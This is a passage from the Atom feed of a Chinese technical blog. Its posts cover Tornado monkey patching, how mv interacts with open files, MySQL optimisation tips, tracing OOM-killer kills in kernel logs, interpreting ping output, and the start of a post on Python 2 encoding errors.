            &lt;span class="n"&gt;html&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;old_generate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;html&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;yy.qiniudn.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;xx.qbox.me&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;html&lt;/span&gt;

        &lt;span class="n"&gt;tornado&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;generate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hack_generate&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="http://stackoverflow.com/questions/5626193/what-is-a-monkey-patch"&gt;stackoverflow上关于Monkey patch的讨论&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="http://ww2.sinaimg.cn/large/79565610gw1etwwmkgxifj20jk0cw0v3.jpg" src="http://ww2.sinaimg.cn/large/79565610gw1etwwmkgxifj20jk0cw0v3.jpg"&gt; &lt;/p&gt;
&lt;p&gt;图片来自网络。&lt;/p&gt;</content></entry><entry><title>mv</title><link href="https://lovedboy.github.io/blog/1970/01/01/mv.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/mv.html</id><summary type="html">&lt;h3&gt;背景&lt;/h3&gt;
&lt;p&gt;最近一个项目，需要限制日志文件的大小，所以会起一个线程去检测日志文件的大小，当到达限制大小后，拷贝日志文件，然后将日志文件清空。&lt;/p&gt;
&lt;p&gt;代码大概长这样子：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;   // 写日志
   f = open(&amp;quot;log.file&amp;quot;)
   log(f, &amp;quot;hello,world&amp;quot;)
   .....

   // 其他线程监控日志文件大小

   size = f.stat().size()
   if size &amp;gt; maxSize{
        CopyFileContent(&amp;quot;log.file&amp;quot;, &amp;quot;log.file.bak&amp;quot;)
        ftruncate(f.fd(), 0)
        f.lseek(0, 0)
   }
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然后有同学问，为什么不直接用mv？&lt;/p&gt;
&lt;h3&gt;MV&lt;/h3&gt;
&lt;p&gt;我们先了解一下mv怎么实现的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mv source target&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;当&lt;code&gt;source&lt;/code&gt;和&lt;code&gt;target …&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h3&gt;背景&lt;/h3&gt;
&lt;p&gt;最近一个项目，需要限制日志文件的大小，所以会起一个线程去检测日志文件的大小，当到达限制大小后，拷贝日志文件，然后将日志文件清空。&lt;/p&gt;
&lt;p&gt;代码大概长这样子：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;   // 写日志
   f = open(&amp;quot;log.file&amp;quot;)
   log(f, &amp;quot;hello,world&amp;quot;)
   .....

   // 其他线程监控日志文件大小

   size = f.stat().size()
   if size &amp;gt; maxSize{
        CopyFileContent(&amp;quot;log.file&amp;quot;, &amp;quot;log.file.bak&amp;quot;)
        ftruncate(f.fd(), 0)
        f.lseek(0, 0)
   }
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然后有同学问，为什么不直接用mv？&lt;/p&gt;
&lt;h3&gt;MV&lt;/h3&gt;
&lt;p&gt;我们先了解一下mv怎么实现的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mv source target&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;当&lt;code&gt;source&lt;/code&gt;和&lt;code&gt;target&lt;/code&gt;在同一个文件系统上是，mv仅仅执行&lt;code&gt;rename()&lt;/code&gt;系统调用，文件本身(inode)是不会改变的，仅仅改变目录的内容，新的文件&lt;code&gt;target&lt;/code&gt;还是指向以前的inode。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当&lt;code&gt;source&lt;/code&gt;和&lt;code&gt;target&lt;/code&gt;在不同的文件系统上，mv会copy文件内容，在新文件系统上创建文件，然后调用unlink删除源文件。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们知道当调用unlink删除文件时，如果有进程正在访问那个文件，内核就不会实际删除文件，所以常常利用这个特性来创建临时文件。&lt;/p&gt;
&lt;p&gt;当处于第一种情况时，日志还是会往&lt;code&gt;target&lt;/code&gt;上面写，并且你可以通过&lt;code&gt;tail -f&lt;/code&gt;来实时查看日志输出，
当处于第二种情况时，你通过ls已经找不到日志文件了，但是文件本身（inode）还是存在的，进程还是在往文件里面写。&lt;/p&gt;
&lt;h3&gt;验证&lt;/h3&gt;
&lt;p&gt;用下面的程序验证第一种情况：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;mport&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;test.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ab&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flush&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;程序运行时，&lt;code&gt;mv test.txt test.txt2&lt;/code&gt;，你可以看到后续的输出被追加到了test.txt2上面。&lt;/p&gt;
&lt;p&gt;验证第二种情况：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;test.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;w+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fork&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flush&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mv test.txt /tmp/test.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;
        &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;seek&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;保证程序的当前目录和/tmp不在同一个文件系统下面。&lt;/p&gt;
&lt;p&gt;你会发现虽然父进程虽然调用了mv命令，但是子进程在睡眠唤醒后，还是会输出&lt;code&gt;1234&lt;/code&gt;，也就是说文件本身并没有被删除。&lt;/p&gt;</content></entry><entry><title>mysql优化</title><link href="https://lovedboy.github.io/blog/1970/01/01/mysqlyou-hua.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/mysqlyou-hua.html</id><summary type="html">&lt;h2&gt;基本的分析命令&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;EXPLAIN&lt;/li&gt;
&lt;li&gt;SHOW CREATE TABLE &lt;/li&gt;
&lt;li&gt;SHOW INDEXES&lt;/li&gt;
&lt;li&gt;SHOW TABLE STATUS&lt;/li&gt;
&lt;li&gt;SHOW STATUS&lt;/li&gt;
&lt;li&gt;SHOW FULL PROCESSLIS&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;索引&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;单列索引&lt;/li&gt;
&lt;li&gt;聚合索引&lt;/li&gt;
&lt;li&gt;覆盖索引&lt;/li&gt;
&lt;li&gt;局部索引&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;优化建议&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;删除重复索引。比如有了聚合索引(a,b,c)，就不需要单列索引(a)&lt;/li&gt;
&lt;li&gt;开启慢查询log。&lt;/li&gt;
&lt;li&gt;Limit 1。当只需要一条数据时使用Limit 1。&lt;/li&gt;
&lt;li&gt;无符号数。其实更多的时候你需要的是无符号数。&lt;/li&gt;
&lt;li&gt;CHAR or VARCHAR。如果字段是不怎么可变的，比如不超过20个字节，那就用CHAR吧。&lt;/li&gt;
&lt;li&gt;ENUM。当需要表示一些状态或者特征码的时候适合用这个。比如订单状态、性别。&lt;/li&gt;
&lt;li&gt;尽可能的NOT NULL。&lt;/li&gt;
&lt;li&gt;IP地址用无符号INT。&lt;/li&gt;
&lt;li&gt;删除重复的sql语句。比如查询10个ID的数据 …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h2&gt;基本的分析命令&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;EXPLAIN&lt;/li&gt;
&lt;li&gt;SHOW CREATE TABLE &lt;/li&gt;
&lt;li&gt;SHOW INDEXES&lt;/li&gt;
&lt;li&gt;SHOW TABLE STATUS&lt;/li&gt;
&lt;li&gt;SHOW STATUS&lt;/li&gt;
&lt;li&gt;SHOW FULL PROCESSLIS&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;索引&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;单列索引&lt;/li&gt;
&lt;li&gt;聚合索引&lt;/li&gt;
&lt;li&gt;覆盖索引&lt;/li&gt;
&lt;li&gt;局部索引&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;优化建议&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;删除重复索引。比如有了聚合索引(a,b,c)，就不需要单列索引(a)&lt;/li&gt;
&lt;li&gt;开启慢查询log。&lt;/li&gt;
&lt;li&gt;Limit 1。当只需要一条数据时使用Limit 1。&lt;/li&gt;
&lt;li&gt;无符号数。其实更多的时候你需要的是无符号数。&lt;/li&gt;
&lt;li&gt;CHAR or VARCHAR。如果字段是不怎么可变的，比如不超过20个字节，那就用CHAR吧。&lt;/li&gt;
&lt;li&gt;ENUM。当需要表示一些状态或者特征码的时候适合用这个。比如订单状态、性别。&lt;/li&gt;
&lt;li&gt;尽可能的NOT NULL。&lt;/li&gt;
&lt;li&gt;IP地址用无符号INT。&lt;/li&gt;
&lt;li&gt;删除重复的sql语句。比如查询10个ID的数据，用IN查询，而不要循环去查。&lt;/li&gt;
&lt;li&gt;重写子查询。连接查询往往比子查询效率更高。&lt;/li&gt;
&lt;li&gt;缓存。mysql缓存或者在应用层做缓存。&lt;/li&gt;
&lt;li&gt;避免select *。不必要的网络开销，会使覆盖索引失效。&lt;/li&gt;
&lt;li&gt;不要 ORDER BY RAND()。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;最后&lt;/h2&gt;
&lt;p&gt;EXPLAIN大法好。&lt;/p&gt;</content></entry><entry><title>omm</title><link href="https://lovedboy.github.io/blog/1970/01/01/omm.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/omm.html</id><summary type="html">&lt;p&gt;最近线上MongoDB服务总是异常停止。查看MongoDB的log也没发现什么异常。网上找了很久，别人都提到了是不是被oom kill了。&lt;/p&gt;
&lt;p&gt;为什么会出现omm kill呢？&lt;/p&gt;
&lt;p&gt;这通常是因为某时刻应用程序大量请求内存导致系统内存不足造成的，这通常会触发 Linux 内核里的 Out of Memory (OOM) killer，OOM killer 会杀掉某个进程以腾出内存留给系统用，不致于让系统立刻崩溃。&lt;/p&gt;
&lt;p&gt;于是我查看system log，(ubuntu下面是&lt;code&gt;/var/log/system.log&lt;/code&gt;) 发现了下面的关键log。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.758208] Out of memory: Kill process 26379 (tmux) score 6 or sacrifice child
Aug …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;最近线上MongoDB服务总是异常停止。查看MongoDB的log也没发现什么异常。网上找了很久，别人都提到了是不是被oom kill了。&lt;/p&gt;
&lt;p&gt;为什么会出现omm kill呢？&lt;/p&gt;
&lt;p&gt;这通常是因为某时刻应用程序大量请求内存导致系统内存不足造成的，这通常会触发 Linux 内核里的 Out of Memory (OOM) killer，OOM killer 会杀掉某个进程以腾出内存留给系统用，不致于让系统立刻崩溃。&lt;/p&gt;
&lt;p&gt;于是我查看system log，(ubuntu下面是&lt;code&gt;/var/log/system.log&lt;/code&gt;) 发现了下面的关键log。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.758208] Out of memory: Kill process 26379 (tmux) score 6 or sacrifice child
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.758279] Killed process 26551 (bash) total-vm:23220kB, anon-rss:2768kB, file-rss:8kB
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859171] mongod invoked oom-killer: gfp_mask=0x84d0, order=0, oom_adj=0, oom_score_adj=0
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859177] mongod cpuset=/ mems_allowed=0
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859180] Pid: 1067, comm: mongod Not tainted 3.2.0-67-generic #101-Ubuntu
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859183] Call Trace:
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859193]  [&amp;lt;ffffffff8111d381&amp;gt;] dump_header+0x91/0xe0
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859196]  [&amp;lt;ffffffff8111d735&amp;gt;] oom_kill_process+0x85/0xb0
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859199]  [&amp;lt;ffffffff8111dada&amp;gt;] out_of_memory+0xfa/0x220
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859203]  [&amp;lt;ffffffff811234fc&amp;gt;] __alloc_pages_nodemask+0x8dc/0x8f0
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859207]  [&amp;lt;ffffffff8115a8a6&amp;gt;] alloc_pages_current+0xb6/0x120
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859213]  [&amp;lt;ffffffff8104552b&amp;gt;] pte_alloc_one+0x1b/0x50
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859217]  [&amp;lt;ffffffff8113d952&amp;gt;] __pte_alloc+0x32/0x160
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859222]  [&amp;lt;ffffffff81053a92&amp;gt;] ? ttwu_queue+0x92/0xd0
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859225]  [&amp;lt;ffffffff81141556&amp;gt;] handle_mm_fault+0x356/0x370
Aug 11 03:48:24 iZ23syelc0bZ kernel: [4612204.859230]  [&amp;lt;ffffffff8166723e&amp;gt;] do_page_fault+0x17e/0x540
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到在03:52的时候mongod进程被kill掉了。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Aug 11 03:52:07 iZ23syelc0bZ kernel: [4612427.964874] Out of memory: Kill process 19716 (mongod) score 6 or sacrifice child
Aug 11 03:52:07 iZ23syelc0bZ kernel: [4612427.965110] Killed process 19716 (mongod) total-vm:135707920kB, anon-rss:103312kB, file-rss:0kB
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;下次服务异常停止，记得查看是否被系统kill了。&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.vpsee.com/2013/10/how-to-configure-the-linux-oom-killer/"&gt;关于oom killer 可以参考这篇文章&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>ping</title><link href="https://lovedboy.github.io/blog/1970/01/01/ping.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/ping.html</id><summary type="html">&lt;h2&gt;原理&lt;/h2&gt;
&lt;p&gt;ping 是用来测试数据包能否通过ip协议到达指定主机的网络工具。原理是向目的主机发出一个&lt;code&gt;ICMP echo&lt;/code&gt;请求，并等待响应数据包。&lt;/p&gt;
&lt;p&gt;值得注意是：发送端发送的选项数据，服务端必须回显。&lt;/p&gt;
&lt;p&gt;ICMP echo 报文格式：&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://ww3.sinaimg.cn/large/79565610jw1f1adgxrwc8j21ao0iqmy4.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;输出解读&lt;/h2&gt;
&lt;p&gt;看一个ping结果的输出截图:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://ww3.sinaimg.cn/large/79565610jw1f1ads0kc1ij20sq08uwh1.jpg"&gt;&lt;/p&gt;
&lt;h3&gt;报文大小&lt;/h3&gt;
&lt;p&gt;图片中的64bytes是ICMP报文的大小，不包括IP头部。可以通过&lt;code&gt;-s&lt;/code&gt; 选项来指定&lt;code&gt;选项数据&lt;/code&gt;大小。&lt;/p&gt;
&lt;h3&gt;icmp_seq&lt;/h3&gt;
&lt;p&gt;ICMP报文序号。序号从0开始，每发送一个请求，序号加1。&lt;/p&gt;
&lt;h3&gt;ttl&lt;/h3&gt;
&lt;p&gt;来源于ICMP应答报文的IP头部的ttl字段，可以用来计算报文经过了多少个路由器。&lt;/p&gt;
&lt;p&gt;根据图片可以看出应答报文经过了&lt;code&gt;64-56=8&lt;/code&gt;个路由器中继。&lt;/p&gt;
&lt;h3&gt;time&lt;/h3&gt;
&lt;p&gt;报文的往返时间。ping程序通过在ICMP报文数据中存放发送请求的时间来计算往返时间。当应答报文返回时，用当前时间减去存放在报文的时间值，就是往返时间。&lt;/p&gt;
&lt;p&gt;如果要在ping结果中显示time统计，ICMP报文选项数据部分至少需要多大？&lt;/p&gt;
&lt;p&gt;答案是16。因为&lt;code&gt;struct timeval&lt;/code&gt;的长度是16，所以报文选项数据部分至少有16个bytes才能放得下timeval结构图 …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;原理&lt;/h2&gt;
&lt;p&gt;ping 是用来测试数据包能否通过ip协议到达指定主机的网络工具。原理是向目的主机发出一个&lt;code&gt;ICMP echo&lt;/code&gt;请求，并等待响应数据包。&lt;/p&gt;
&lt;p&gt;值得注意是：发送端发送的选项数据，服务端必须回显。&lt;/p&gt;
&lt;p&gt;ICMP echo 报文格式：&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://ww3.sinaimg.cn/large/79565610jw1f1adgxrwc8j21ao0iqmy4.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;输出解读&lt;/h2&gt;
&lt;p&gt;看一个ping结果的输出截图:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://ww3.sinaimg.cn/large/79565610jw1f1ads0kc1ij20sq08uwh1.jpg"&gt;&lt;/p&gt;
&lt;h3&gt;报文大小&lt;/h3&gt;
&lt;p&gt;图片中的64bytes是ICMP报文的大小，不包括IP头部。可以通过&lt;code&gt;-s&lt;/code&gt; 选项来指定&lt;code&gt;选项数据&lt;/code&gt;大小。&lt;/p&gt;
&lt;h3&gt;icmp_seq&lt;/h3&gt;
&lt;p&gt;ICMP报文序号。序号从0开始，每发送一个请求，序号加1。&lt;/p&gt;
&lt;h3&gt;ttl&lt;/h3&gt;
&lt;p&gt;来源于ICMP应答报文的IP头部的ttl字段，可以用来计算报文经过了多少个路由器。&lt;/p&gt;
&lt;p&gt;根据图片可以看出应答报文经过了&lt;code&gt;64-56=8&lt;/code&gt;个路由器中继。&lt;/p&gt;
&lt;h3&gt;time&lt;/h3&gt;
&lt;p&gt;报文的往返时间。ping程序通过在ICMP报文数据中存放发送请求的时间来计算往返时间。当应答报文返回时，用当前时间减去存放在报文的时间值，就是往返时间。&lt;/p&gt;
&lt;p&gt;如果要在ping结果中显示time统计，ICMP报文选项数据部分至少需要多大？&lt;/p&gt;
&lt;p&gt;答案是16。因为&lt;code&gt;struct timeval&lt;/code&gt;的长度是16，所以报文选项数据部分至少有16个bytes才能放得下timeval结构图。&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://ww3.sinaimg.cn/large/79565610jw1f1aebza3hvj20oc05it9z.jpg"&gt;&lt;/p&gt;
&lt;p&gt;可以看出15个bytes是没有时间统计输出的。&lt;/p&gt;</content></entry><entry><title>Python2编码问题</title><link href="https://lovedboy.github.io/blog/1970/01/01/python2bian-ma-wen-ti.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/python2bian-ma-wen-ti.html</id><summary type="html">&lt;h3&gt;背景&lt;/h3&gt;
&lt;p&gt;做Python开发的同学对下面的错误一定很熟悉：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;UnicodeEncodeError: &amp;#39;ascii&amp;#39; codec can&amp;#39;t encode characters in position 0-1: ordinal not in range(128)

UnicodeDecodeError: &amp;#39;ascii&amp;#39; codec can&amp;#39;t decode byte 0xe4 in position 0: ordinal not in range(128)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这也是Python2的一大黑点啊：）&lt;/p&gt;
&lt;p&gt;Python2中有两种字符串类型。分别是&lt;code&gt;str&lt;/code&gt;和&lt;code&gt;unicode&lt;/code&gt;。（Py3已经统一成unicode)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;str&lt;/code&gt; 是由bytes组成的sequence，&lt;code&gt;unicode&lt;/code&gt;是Unicode字符集组成的sequence。&lt;/p&gt;
&lt;p&gt;string里的有多种编码方式，比如最常用的ascii和utf-8。想解读string，必需知道string里的character是用哪种编码方式，然后才能进行。&lt;/p&gt;
&lt;p&gt;unicode有一个 …&lt;/p&gt;</summary><content type="html">&lt;h3&gt;背景&lt;/h3&gt;
&lt;p&gt;做Python开发的同学对下面的错误一定很熟悉：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;UnicodeEncodeError: &amp;#39;ascii&amp;#39; codec can&amp;#39;t encode characters in position 0-1: ordinal not in range(128)

UnicodeDecodeError: &amp;#39;ascii&amp;#39; codec can&amp;#39;t decode byte 0xe4 in position 0: ordinal not in range(128)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这也是Python2的一大黑点啊：）&lt;/p&gt;
